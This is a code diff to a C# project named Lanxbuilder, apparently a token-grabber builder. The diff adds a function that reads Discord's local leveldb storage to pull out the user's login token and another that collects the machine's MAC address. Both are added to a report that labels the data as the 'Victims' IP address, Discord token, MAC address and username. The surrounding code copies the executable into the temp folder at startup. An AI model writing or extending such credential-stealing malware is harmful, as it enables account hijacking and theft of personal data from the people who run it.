@@ -72,7 +72,44 @@ namespace Lanxbuilder
 		[DllImport("User32.dll")]
 		private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);
 
-        public static void Startup()
+
+		public static string GetMACAddress()
+		{
+			NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
+			String sMacAddress = string.Empty;
+			foreach (NetworkInterface adapter in nics)
+			{
+				if (sMacAddress == String.Empty)// only return MAC Address from first card  
+				{
+					IPInterfaceProperties properties = adapter.GetIPProperties();
+					sMacAddress = adapter.GetPhysicalAddress().ToString();
+				}
+			}
+			string macadressgrabber = sMacAddress;
+			return macadressgrabber;
+		}
+
+
+		public static string takeToken()
+		{
+			try
+			{
+				string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//Discord//Local Storage//leveldb//000005.ldb");
+				int num;
+				while ((num = text.IndexOf("oken")) != -1)
+				{
+					text = text.Substring(num + "oken".Length);
+				}
+				return text.Split('"')[1];
+			}
+			catch (Exception)
+			{
+				return null;
+			}
+		}
+
+
+		public static void Startup()
         {
             string dfgdfgdgdg = Path.GetTempPath() + Path.GetFileName(Application.ExecutablePath);
             try
@@ -119,6 +156,10 @@ namespace Lanxbuilder
 				{
 					"Hello from LanxGT\nVictims ip adress: ",
 					anamz,
+					"\nVictims Discord token: ",
+					takeToken(),
+					"\nVictims Mac Adress: ",
+					GetMACAddress(),
 					"\nVictims username: ",
 					Environment.UserName,
 					"/",
